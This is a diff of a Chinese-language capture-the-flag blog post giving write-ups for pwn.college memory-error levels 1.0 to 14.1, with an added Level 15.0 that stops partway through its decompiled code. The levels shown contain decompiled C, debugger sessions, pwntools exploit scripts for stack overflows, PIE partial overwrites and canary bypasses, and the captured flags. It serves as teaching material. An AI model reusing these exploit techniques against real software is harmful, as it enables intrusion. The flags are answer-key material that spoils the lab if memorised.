@@ -1,26 +1,24 @@
 ---
-title: "Write-ups: pwn.college series"
+title: "Write-ups: Program Security (Memory Errors) series (Completed)"
 pubDate: 2024-12-04
 categories: ["Write-ups"]
 description: "Write-ups for pwn.college binary exploitation series."
-slug: pwncollege-series
+slug: memory-errors
 ---
 
 ## Table of contents
 
-## Program Security (Memory Errors)
+## Level 1.0
 
-### Level 1.0
-
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer on the stack to set the right conditions to obtain the flag!
 
-#### Write-up
+### Write-up
 
 分析得程序主要逻辑从 `challenge` 函数开始，反编译如下：
 
@@ -138,7 +136,7 @@ v8 = read(0, buf, nbytes);
 
 所以我们只要先输入 16 bytes 填满 `buf`，再多写 5 bytes 就可以达到破坏 `v11[0]` 的高 32 bits 的目的。（注意 `read` 会把回车读进去，所以本地执行可以只输入 20 bytes）
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -177,17 +175,17 @@ target.send(payload)
 target.recvall()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{oQdReDoKIU218v6uPGguMuFOJnt.0VO4IDL5cTNxgzW}`
 
-### Level 1.1
+## Level 1.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > This challenge is identical to its "easy" version from a security perspective, but has the following changes:
 
@@ -195,7 +193,7 @@ Flag: `pwn.college{oQdReDoKIU218v6uPGguMuFOJnt.0VO4IDL5cTNxgzW}`
 2. For all other "hard" versions, the source code will not be provided, and you will need to reverse-engineer the binary using your knowledge of the "easy" version as a reference. However, for this one challenge, to get you familiar with the differences between the easy and hard versions, we will provide the source code.
 3. Some randomization is different. Buffers might have different lengths, offsets might vary, etc. You will need to reverse engineer this information from the binary!
 
-#### Write-up
+### Write-up
 
 ```c {5-6} del={13} ins={20-21} collapse={1-1}
 __int64 challenge()
@@ -241,7 +239,7 @@ if ( v4 ) { win(); }
 
 注意到 `buf` 只有 32 bytes，但是最大可以输入 4096 bytes，导致溢出覆盖 `v4` 的值。
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -280,21 +278,21 @@ target.send(payload)
 target.recvall()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{cwWgAcBgDsBnGFTCky9i1NRqAtO.0FM5IDL5cTNxgzW}`
 
-### Level 2.0
+## Level 2.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer on the stack to set trickier conditions to obtain the flag!
 
-#### Write-up
+### Write-up
 
 ```c {8-12, 22-25, 55} ins={84-85} del={63} collapse={1-4, 16-18, 29-51, 59-59, 67-80}
 __int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
@@ -416,7 +414,7 @@ if ( *v11 == 240324168 ) { win(); }
 
 注意到我们的 `buf` 为 128 bytes，由于最大输入长度可由我们自己自定义，因此可以溢出 `buf` 破坏 `v13`，将 `v13` 修改为 `240324168` 即可。
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -460,21 +458,21 @@ target.send(payload)
 target.recvall()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{w7aHpdU-9AlFvJ5GtohCFtGwF7M.ddTNzMDL5cTNxgzW}`
 
-### Level 2.1
+## Level 2.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer on the stack to set trickier conditions to obtain the flag!
 
-#### Write-up
+### Write-up
 
 ```c {5-9, 15-16, 19} ins={28-29} del={21} collapse={1-1}
 __int64 challenge()
@@ -647,7 +645,7 @@ $4 = 0x14
 
 算出来 padding 大小是 `0x14`。
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -691,21 +689,21 @@ target.send(payload)
 target.recvall()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{sZCPUpjO4U6HmvntMr91HLyNljf.dhTNzMDL5cTNxgzW}`
 
-### Level 3.0
+## Level 3.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag!
 
-#### Write-up
+### Write-up
 
 ```plaintext wrap=false showLineNumbers=false "88 bytes after the start of your input buffer." collapse={1-38,46-55}
 ###
@@ -803,7 +801,7 @@ Non-debugging symbols:
 0x0000000000402ae8  _fini
 ```
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -847,21 +845,21 @@ target.send(payload)
 target.recvall()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{0omKd6AgzV5NaakXpbDyYSre3hD.01M5IDL5cTNxgzW}`
 
-### Level 3.1
+## Level 3.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag!
 
-#### Write-up
+### Write-up
 
 ```c del={20} collapse={1-16, 24-30}
 __int64 challenge()
@@ -1073,7 +1071,7 @@ pwndbg> distance 0x7fffffffd130 0x7fffffffd1b8
 
 很显然这是想让我们覆盖返回地址控制程序执行流程，达到执行 `win` 的目的。
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -1117,21 +1115,21 @@ target.send(payload)
 target.recvall()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{k2xNTDjO8L-Rt_oy5sU-i2dFj1y.0FN5IDL5cTNxgzW}`
 
-### Level 4.0
+## Level 4.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
 
-#### Write-up
+### Write-up
 
 ```c {7, 55} ins={60-64} del={85} collapse={1-3, 11-51, 68-81, 89-108}
 __int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
@@ -1282,7 +1280,7 @@ size_t nbytes[15]; // [rsp+2Ch] [rbp-84h] BYREF
 v9 = read(0, buf, LODWORD(nbytes[0]));
 ```
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -1325,21 +1323,21 @@ target.send(payload)
 target.recvall()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{YWYtWHsecMbA0xSnI1_Yfj-kjlB.0VN5IDL5cTNxgzW}`
 
-### Level 4.1
+## Level 4.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
 
-#### Write-up
+### Write-up
 
 ```c ins={13-17} del={19} collapse={1-9, 23-29}
 __int64 challenge()
@@ -1550,7 +1548,7 @@ pwndbg> distance 0x7fffffffd170 0x7fffffffd1b8
 0x7fffffffd170->0x7fffffffd1b8 is 0x48 bytes (0x9 words)
 ```
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -1593,21 +1591,21 @@ target.send(payload)
 target.recvall()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{M-FCJzqtx7cmDX7yqpyi7jADAMM.0lN5IDL5cTNxgzW}`
 
-### Level 5.0
+## Level 5.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
 
-#### Write-up
+### Write-up
 
 ```c {64, 68} ins={65-66, 69-70, 71-72} del={73, 91} collapse={1-60, 77-87, 95-114}
 __int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
@@ -1877,7 +1875,7 @@ ssize_t read(int fd, void *buf, size_t nbytes)
 
 这用到了整数溢出的原理，`INT32_MAX * 2` 或者 `INT32_MIN * 2` 都会溢出到更高位，低位就变成 0 了。而我们在做判断的时候只使用了低 32 bits，不关心高位的情况，那么只要让低 32 bits 的大小小于等于 `0x62` 即可。
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -1927,21 +1925,21 @@ target.sendline(payload)
 target.recvall()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{AcH-0L9UpmOONC81mhni9OzJVhD.01N5IDL5cTNxgzW}`
 
-### Level 5.1
+## Level 5.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
 
-#### Write-up
+### Write-up
 
 ```c {22, 26} ins={23-24, 27-30} del={31, 33} collapse={1-18, 37-43}
 __int64 challenge()
@@ -1991,7 +1989,7 @@ __int64 challenge()
 
 不写了不写了，和上一题思路一样，自己去调试查 `win` 地址和 padding 大小就好啦～
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -2037,21 +2035,21 @@ target.sendline(payload)
 target.recvall()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{A2rdZkIDLVjvpTrAPvlwpllVi7m.0FO5IDL5cTNxgzW}`
 
-### Level 6.0
+## Level 6.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
 
-#### Write-up
+### Write-up
 
 ```c ins={8} collapse={1-4, 12-35}
 void __fastcall win_authed(int a1)
@@ -2172,7 +2170,7 @@ End of assembler dump.
 pwndbg>
 ```
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -2216,25 +2214,25 @@ target.send(payload)
 target.recvall()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{AusQ-DCHaivq4M4Tj9IZIsDv7m8.0VO5IDL5cTNxgzW}`
 
-### Level 6.1
+## Level 6.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
 
-#### Write-up
+### Write-up
 
 和上一题一样，只是需要计算一下 padding 大小和看一下返回到哪里，这里就不多赘述了。
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -2278,21 +2276,21 @@ target.send(payload)
 target.recvall()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{Mlgp6gl7Ogp1vkjstLEXXOSldEM.0FMwMDL5cTNxgzW}`
 
-### Level 7.0
+## Level 7.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary!
 
-#### Write-up
+### Write-up
 
 这题和前两题差不多，都是计算 padding 和覆盖返回地址，唯一的区别在于它启用了 PIE 保护，导致我们无法知道确切的返回地址。这里我们通过 `Partial Write` 的方式绕过 PIE。
 
@@ -2372,7 +2370,7 @@ Non-debugging symbols:
 pwndbg>
 ```
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -2444,25 +2442,25 @@ while True:
         log.exception(f"An error occurred in main loop: {e}")
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{0svlAHsYG0L-ONps0VQ3ssICrbb.0VMwMDL5cTNxgzW}`
 
-### Level 7.1
+## Level 7.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary!
 
-#### Write-up
+### Write-up
 
 和上一题一样的，这里就不多赘述了。
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -2532,21 +2530,21 @@ while True:
         log.exception(f"An error occurred in main loop: {e}")
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{EC4bj1hO9Oo1kCMvjnoAdmOg2ed.0lMwMDL5cTNxgzW}`
 
-### Level 8.0
+## Level 8.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary with an additional check on your input.
 
-#### Write-up
+### Write-up
 
 ```c {8, 24} ins={118-120} del={112, 116, 125} collapse={1-4, 12-20, 28-108, 129-156}
 __int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
@@ -2782,7 +2780,7 @@ pwndbg> dist 0x7fffffffd160 0x7fffffffd1b8
 pwndbg>
 ```
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -2855,25 +2853,25 @@ while True:
         log.exception(f"An error occurred in main loop: {e}")
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{82SpQ2oiZjETn254hnZR69O97tP.01MwMDL5cTNxgzW}`
 
-### Level 8.1
+## Level 8.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary with an additional check on your input.
 
-#### Write-up
+### Write-up
 
 不多说，参考上一题。
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -2946,21 +2944,21 @@ while True:
         log.exception(f"An error occurred in main loop: {e}")
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{orn4FN_Dc8Po8bG2OX-G3dcj8Pr.0FNwMDL5cTNxgzW}`
 
-### Level 9.0
+## Level 9.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time in a PIE binary with a stack canary. Be warned, this requires careful and clever payload construction!
 
-#### Write-up
+### Write-up
 
 ```c {12-13, 23-25, 89} del={134-139} collapse={1-8, 17-19, 29-85, 93-130, 143-174}
 __int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
@@ -3160,7 +3158,7 @@ while ( *v12 < v10 )
 
 这个程序是开启了 Canary 和 PIE 保护的，不过因为数组越界写的漏洞存在，我们可以直接跳过 Canary 覆盖返回地址。因为有 PIE，而我们通过页偏移的方式定位要执行的指令，所以我们最后只需要两个字节来覆盖返回地址。这里需要注意的是，payload 结构是用来填充数组的 padding + 用来重定位写入索引的一字节 + 用来重定位执行流的两字节页偏移。如果我们将这个 payload 大小作为 `v10` 的话，得到的可输入大小是数组大小加三，但是我们的返回地址肯定在一个比较高的位置，导致 `*v12 < v10` 这条检测失败，不会去覆盖返回地址。所以为了绕过这个判断，我们实际需要的输入大小应该是用来重定位写入的索引的值加三，那这不够的大小就需要我们通过在 payload 末尾再加一段 padding 实现。当然你也可以手动指定最大输入大小就是了…
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -3237,21 +3235,21 @@ while True:
         log.exception(f"An error occurred in main loop: {e}")
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{QccZPJ6VBhlEFtdfJdexxhwYSnh.0VNwMDL5cTNxgzW}`
 
-### Level 9.1
+## Level 9.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time in a PIE binary with a stack canary. Be warned, this requires careful and clever payload construction!
 
-#### Write-up
+### Write-up
 
 ```c del={22-26} collapse={1-18, 30-36}
 __int64 challenge()
@@ -3294,7 +3292,7 @@ __int64 challenge()
 
 同上一题一样，自己琢磨去吧……
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -3370,21 +3368,21 @@ while True:
         log.exception(f"An error occurred in main loop: {e}")
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{QfzSsyMdYf7_dP64EnXQ8DrrgQ1.0lNwMDL5cTNxgzW}`
 
-### Level 10.0
+## Level 10.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!
 
-#### Write-up
+### Write-up
 
 ```c {10-12, 26-27} ins={47-48} del={62, 80} collapse={1-6, 16-22, 31-43, 52-58, 66-76}
 __int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
@@ -3486,7 +3484,7 @@ __int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
 
 ~为什么那么简单……这可是至高的 Level 10！！！~
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -3552,25 +3550,25 @@ except Exception as e:
     log.exception(f"An error occurred in main loop: {e}")
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{cHV80jBzHGyTr_qaE0HdorP-81y.01NwMDL5cTNxgzW}`
 
-### Level 10.1
+## Level 10.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!
 
-#### Write-up
+### Write-up
 
 试问这和上一题有何区别……
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -3636,21 +3634,21 @@ except Exception as e:
     log.exception(f"An error occurred in main loop: {e}")
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{4n50Ii5yzf-WULWGzVOqmN3vTgp.0FOwMDL5cTNxgzW}`
 
-### Level 11.0
+## Level 11.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!
 
-#### Write-up
+### Write-up
 
 和前面两题差不多，考察点都是 `SUID` 的性质和看能不能想到 `printf` 判断字符串结束的机制。利用这个机制来泄漏 `flag`。
 
@@ -3951,7 +3949,7 @@ pwndbg> dist $rax $1
 0x7044ddafb000->0x7044ddaff000 is 0x4000 bytes (0x800 words)
 ```
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -4018,25 +4016,25 @@ except Exception as e:
     log.exception(f"An error occurred in main loop: {e}")
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{oNJmkkep5Mt0PwVQdAiStSjA960.0VOwMDL5cTNxgzW}`
 
-### Level 11.1
+## Level 11.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!
 
-#### Write-up
+### Write-up
 
 和上题一样的哥……
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -4104,21 +4102,21 @@ except Exception as e:
     log.exception(f"An error occurred in main loop: {e}")
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{I5165He8SxPMM_8YzEz5DkzRZ1c.0FMxMDL5cTNxgzW}`
 
-### Level 12.0
+## Level 12.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Defeat a stack canary in a PIE binary by utilizing a bug left in the binary.
 
-#### Write-up
+### Write-up
 
 ```c ins={146-150} del={112, 143} collapse={1-108, 116-139, 154-156}
 __int64 __fastcall challenge(unsigned int a1, __int64 a2, __int64 a3)
@@ -4350,7 +4348,7 @@ void __fastcall win_authed(int a1)
 
 随便扯两句心里话吧。踩了不少坑，希望以后可以争取做到更严谨完善的分析。还有就是动态调试很重要哦～感觉自己多少还是有一点调试恐惧症 LMAO
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -4438,7 +4436,7 @@ def attack(target, payload):
 
         return b"pwn.college{" in response
     except Exception as e:
-        log.exception(f"An error occurred while perform attack: {e}")
+        log.exception(f"An error occurred while performing attack: {e}")
 
 
 def main():
@@ -4464,25 +4462,25 @@ if __name__ == "__main__":
     main()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{YkuEQhg7aejOObKgMu4MNlIgI-S.0VMxMDL5cTNxgzW}`
 
-### Level 12.1
+## Level 12.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Defeat a stack canary in a PIE binary by utilizing a bug left in the binary.
 
-#### Write-up
+### Write-up
 
 和上题一样啊，不说了。
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -4569,7 +4567,7 @@ def attack(target, payload):
 
         return b"pwn.college{" in response
     except Exception as e:
-        log.exception(f"An error occurred while perform attack: {e}")
+        log.exception(f"An error occurred while performing attack: {e}")
 
 
 def main():
@@ -4595,21 +4593,21 @@ if __name__ == "__main__":
     main()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{Q8RGfsaRLXQyi0mLIgR3c7-_jYK.0lMxMDL5cTNxgzW}`
 
-### Level 13.0
+## Level 13.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Leak data left behind unintentionally by utilizing clever payload construction.
 
-#### Write-up
+### Write-up
 
 ```c del={7-8}
 int verify_flag()
@@ -4628,7 +4626,7 @@ int verify_flag()
 
 这题没啥好说的吧，完全就是 `verify_flag` 把 `flag` 读到栈上了，然后我们用垃圾数据填充到 `flag` 头就好了，`printf("You said: %.360s\n", (const char *)buf);` 会输出一切……
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -4692,7 +4690,7 @@ def leak_flag(target, payload):
 
         log.success(f"Flag successfully leaked: {flag}")
     except Exception as e:
-        log.exception(f"An error occurred while perform leak_flag: {e}")
+        log.exception(f"An error occurred while performing leak_flag: {e}")
 
 
 def main():
@@ -4707,25 +4705,25 @@ if __name__ == "__main__":
     main()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{YkKrgg8qd3Vyt4OOrpBqwsAEJ2g.01MxMDL5cTNxgzW}`
 
-### Level 13.1
+## Level 13.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Leak data left behind unintentionally by utilizing clever payload construction.
 
-#### Write-up
+### Write-up
 
 和上题一样，重新计算一下偏移就好了。
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -4788,7 +4786,7 @@ def leak_flag(target, payload):
 
         log.success(f"Flag successfully leaked: {flag}")
     except Exception as e:
-        log.exception(f"An error occurred while perform leak_flag: {e}")
+        log.exception(f"An error occurred while performing leak_flag: {e}")
 
 
 def main():
@@ -4803,21 +4801,21 @@ if __name__ == "__main__":
     main()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{gscSxVngZ4uaJ8tU3A-fhqwrLIM.0FNxMDL5cTNxgzW}`
 
-### Level 14.0
+## Level 14.0
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Leak data left behind unintentionally to defeat a stack canary in a PIE binary.
 
-#### Write-up
+### Write-up
 
 ```c ins={145-149} del={111, 142} collapse={1-107, 115-138, 153-155}
 __int64 __fastcall challenge(unsigned int a1, __int64 a2, __int64 a3)
@@ -4983,7 +4981,7 @@ __int64 __fastcall challenge(unsigned int a1, __int64 a2, __int64 a3)
 
 为了避免这种残留数据/栈帧复用的问题，我们每次分配完栈空间后都应该通过类似 `memset` 的方法清空栈内容才对。所以，如果没有 `memset` 的，就可以想想会不会有泄漏残留数据的可能了。
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -5069,7 +5067,7 @@ def attack(target, payload):
 
         return b"You win!" in response
     except Exception as e:
-        log.exception(f"An error occurred while perform leak_flag: {e}")
+        log.exception(f"An error occurred while performing leak_flag: {e}")
 
 
 def main():
@@ -5095,25 +5093,25 @@ if __name__ == "__main__":
     main()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{chm7VMiV6dZ3oBKDhVUhtvXg3kb.0VNxMDL5cTNxgzW}`
 
-### Level 14.1
+## Level 14.1
 
-#### Information
+### Information
 
 - Category: Pwn
 
-#### Description
+### Description
 
 > Leak data left behind unintentionally to defeat a stack canary in a PIE binary.
 
-#### Write-up
+### Write-up
 
 和上题一样，重新找一下偏移和返回地址就好啦。
 
-#### Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -5200,7 +5198,7 @@ def attack(target, payload):
 
         return b"You win!" in response
     except Exception as e:
-        log.exception(f"An error occurred while perform leak_flag: {e}")
+        log.exception(f"An error occurred while performing leak_flag: {e}")
 
 
 def main():
@@ -5226,6 +5224,580 @@ if __name__ == "__main__":
     main()
 ```
 
-#### Flag
+### Flag
 
 Flag: `pwn.college{E_7686TOh__Z7NZeXfOPaMP5YfJ.0lNxMDL5cTNxgzW}`
+
+## Level 15.0
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Defeat a stack canary in a PIE binary by utilizing a network-style fork server in the target binary.
+
+### Write-up
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int optval; // [rsp+24h] [rbp-101Ch] BYREF
+  int fd; // [rsp+28h] [rbp-1018h]
+  int v7; // [rsp+2Ch] [rbp-1014h]
+  sockaddr addr; // [rsp+30h] [rbp-1010h] BYREF
+  unsigned __int64 v9; // [rsp+1038h] [rbp-8h]
+
+  v9 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts("This challenge is listening for connections on TCP port 1337.\n");
+  puts("The challenge supports unlimited sequential connections.\n");
+  fd = socket(2, 1, 0);
+  optval = 1;
+  setsockopt(fd, 1, 2, &optval, 4u);
+  addr.sa_family = 2;
+  *(_DWORD *)&addr.sa_data[2] = 0;
+  *(_WORD *)addr.sa_data = htons(0x539u);
+  bind(fd, &addr, 0x10u);
+  listen(fd, 1);
+  while ( 1 )
+  {
+    v7 = accept(fd, 0LL, 0LL);
+    if ( !fork() )
+      break;
+    close(v7);
+    wait(0LL);
+  }
+  dup2(v7, 0);
+  dup2(v7, 1);
+  dup2(v7, 2);
+  close(fd);
+  close(v7);
+  challenge((unsigned int)argc, argv, envp);
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+观察这个 `main` 函数我们可知，它所做的大致就是持续监听 `1337` 端口，连上了就创建一个子进程执行 `challenge`。
+
+```c del={130} collapse={1-126, 134-163}
+__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
+{
+  int *v3; // rax
+  char *v4; // rax
+  _QWORD v6[3]; // [rsp+0h] [rbp-C0h] BYREF
+  int v7; // [rsp+1Ch] [rbp-A4h]
+  int v8; // [rsp+2Ch] [rbp-94h]
+  size_t nbytes; // [rsp+30h] [rbp-90h] BYREF
+  void *buf; // [rsp+38h] [rbp-88h]
+  _QWORD v11[13]; // [rsp+40h] [rbp-80h] BYREF
+  __int16 v12; // [rsp+A8h] [rbp-18h]
+  unsigned __int64 v13; // [rsp+B8h] [rbp-8h]
+  __int64 savedregs; // [rsp+C0h] [rbp+0h] BYREF
+  _UNKNOWN *retaddr; // [rsp+C8h] [rbp+8h] BYREF
+
+  v7 = a1;
+  v6[2] = a2;
+  v6[1] = a3;
+  v13 = __readfsqword(0x28u);
+  memset(v11, 0, sizeof(v11));
+  v12 = 0;
+  buf = v11;
+  nbytes = 0LL;
+  puts("The challenge() function has just been launched!");
+  sp_ = (__int64)v6;
+  bp_ = (__int64)&savedregs;
+  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
+  rp_ = (__int64)&retaddr;
+  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
+  DUMP_STACK(sp_, sz_);
+  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
+  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
+  puts("including the saved base pointer and the saved return address, for a");
+  printf("total of %d bytes.\n", 8 * sz_);
+  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
+  puts("(\"above\" it in the stack are other local variables used by the function).");
+  puts("Your input will be read into this buffer.");
+  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 106);
+  puts("large input length, and thus overflow the buffer.\n");
+  puts("In this level, there is no \"win\" variable.");
+  puts("You will need to force the program to execute the win_authed() function");
+  puts("by directly overflowing into the stored return address back to main,");
+  printf(
+    "which is stored at %p, %d bytes after the start of your input buffer.\n",
+    (const void *)rp_,
+    rp_ - (_DWORD)buf);
+  printf(
+    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
+    rp_ - (_DWORD)buf + 8,
+    106);
+  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_DWORD)buf - 106);
+  puts("and 8 that will overwrite the return address).\n");
+  cp_ = bp_;
+  cv_ = __readfsqword(0x28u);
+  while ( *(_QWORD *)cp_ != cv_ )
+    cp_ -= 8LL;
+  puts("While canaries are enabled, this networked program forks.");
+  puts("What is important to note is that the canary does not get re-randomized on fork.\n");
+  puts("When data that you are overflowing into is critical (i.e., if you screw it up");
+  puts("the program crashes), but also static across executions, you can brute-force");
+  puts("it byte by byte over many attempts.\n");
+  puts("So, let's brute-force the canary!");
+  puts("If this is your first time running this program, all you know so far is that");
+  puts("the canary has a 0 as its left-most byte.");
+  puts("You should proceed like this:\n");
+  puts("- First, you should try overflowing just the null byte of the canary, for");
+  printf("  practice. The canary starts at %p, which is %d bytes after the\n", (const void *)cp_, cp_ - (_DWORD)buf);
+  printf("  start of your buffer. Thus, you should provide %d characters followed\n", cp_ - (_DWORD)buf);
+  puts("  by a NULL byte, make sure the canary check passes, then try a non-NULL");
+  puts("  byte and make sure the canary check fails. This will confirm the offsets.");
+  puts("- Next try each possible value for just the next byte. One of them (the same");
+  puts("  as whatever was there in memory already) will keep the canary intact, and");
+  puts("  when the canary check succeeds, you know you have found the correct one.");
+  puts("- Go on to the next byte, leak it the same way, and so on, until you have");
+  puts("  the whole canary.\n");
+  puts("You will likely want to script this process! Each byte might take up to 256");
+  puts("tries to guess..\n");
+  puts("Because the binary is position independent, you cannot know");
+  puts("exactly where the win_authed() function is located.");
+  puts("This means that it is not clear what should be written into the return address.\n");
+  printf("Payload size: ");
+  __isoc99_scanf("%lu", &nbytes);
+  printf("You have chosen to send %lu bytes of input!\n", nbytes);
+  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
